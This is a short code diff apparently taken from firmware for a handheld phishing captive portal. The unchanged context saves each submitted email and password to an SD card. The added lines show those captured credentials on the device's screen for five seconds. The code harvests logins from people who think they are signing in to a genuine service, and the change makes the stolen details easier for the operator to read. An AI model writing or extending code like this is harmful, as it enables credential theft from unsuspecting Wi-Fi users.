@@ -236,6 +236,9 @@ String index_POST() {
 
 #if defined(SDCARD)
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.print(email + "    " + password); //displays the email and password at the bottom of the screen
+  delay(5000); //holds for 5 secs
 #endif
   return getHtmlContents(LOGIN_AFTER_MESSAGE);
 }
